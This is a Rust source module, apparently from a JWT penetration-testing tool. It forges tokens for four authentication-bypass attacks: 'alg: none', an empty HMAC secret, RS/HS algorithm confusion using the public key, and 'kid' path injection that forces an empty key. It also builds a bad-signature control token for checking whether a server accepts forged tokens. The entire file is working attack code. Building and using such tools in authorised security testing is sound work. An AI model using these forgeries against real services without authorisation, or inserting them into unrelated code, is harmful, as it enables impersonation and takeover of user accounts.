use super::{crypto, parse};

pub struct AttackToken {
    pub name: &'static str,
    pub token: String,
    pub header: String,
}

const ALG_NONE: &str = "alg-none";
const ALG_CONFUSION: &str = "alg-confusion";
const BLANK_SECRET: &str = "blank-secret";
const KID_INJECT: &str = "kid-injection";
const HS256: &str = "HS256";
const BAD_SIG: &str = "ZGVhZGJlZWY";

struct Forged {
    header_b64: String,
    payload_b64: String,
    header_str: String,
    signing_input: String,
}

fn forge(jwt: &parse::Jwt, set: &[(&str, &str)]) -> Forged {
    let mut header = jwt.header_json.clone();
    if let Some(obj) = header.as_object_mut() {
        for &(k, v) in set {
            obj.insert(k.to_string(), serde_json::Value::from(v));
        }
    }
    let header_str = serde_json::to_string(&header).unwrap();
    let header_b64 = parse::encode_part(header_str.as_bytes());
    let payload_b64 = parse::encode_part(&jwt.payload);
    let signing_input = format!("{header_b64}.{payload_b64}");
    Forged { header_b64, payload_b64, header_str, signing_input }
}

pub fn all_attacks(jwt: &parse::Jwt, algorithm: &str, pubkey: Option<&str>, kid_path: Option<&str>) -> Vec<AttackToken> {
    let mut attacks = vec![none_attack(jwt), blank_secret_attack(jwt, algorithm)];
    if let Some(key) = pubkey {
        attacks.push(confusion_attack(jwt, algorithm, key));
    }
    if let Some(kid) = kid_path {
        attacks.push(kid_injection_attack(jwt, kid));
    }
    attacks
}

fn none_attack(jwt: &parse::Jwt) -> AttackToken {
    let f = forge(jwt, &[("alg", "none")]);
    AttackToken { name: ALG_NONE, token: format!("{}.{}.", f.header_b64, f.payload_b64), header: f.header_str }
}

fn blank_secret_attack(jwt: &parse::Jwt, algorithm: &str) -> AttackToken {
    let f = forge(jwt, &[("alg", algorithm)]);
    let sig = crypto::hmac_sign(b"", algorithm, &f.signing_input);
    AttackToken { name: BLANK_SECRET, token: format!("{}.{sig}", f.signing_input), header: f.header_str }
}

fn confusion_attack(jwt: &parse::Jwt, algorithm: &str, pubkey: &str) -> AttackToken {
    let f = forge(jwt, &[("alg", algorithm)]);
    let sig = crypto::hmac_sign(pubkey.as_bytes(), algorithm, &f.signing_input);
    AttackToken { name: ALG_CONFUSION, token: format!("{}.{sig}", f.signing_input), header: f.header_str }
}

fn kid_injection_attack(jwt: &parse::Jwt, path: &str) -> AttackToken {
    // /dev/null-style kid: force a symmetric alg so the empty keyfile is the HMAC key.
    let f = forge(jwt, &[("kid", path), ("alg", HS256)]);
    let sig = crypto::hmac_sign(b"", HS256, &f.signing_input);
    AttackToken { name: KID_INJECT, token: format!("{}.{sig}", f.signing_input), header: f.header_str }
}

/// Valid structure, deliberately invalid signature. A server that checks
/// signatures must reject this; it is the control for the acceptance oracle.
pub fn control_token(jwt: &parse::Jwt) -> String {
    let f = forge(jwt, &[]);
    format!("{}.{BAD_SIG}", f.signing_input)
}
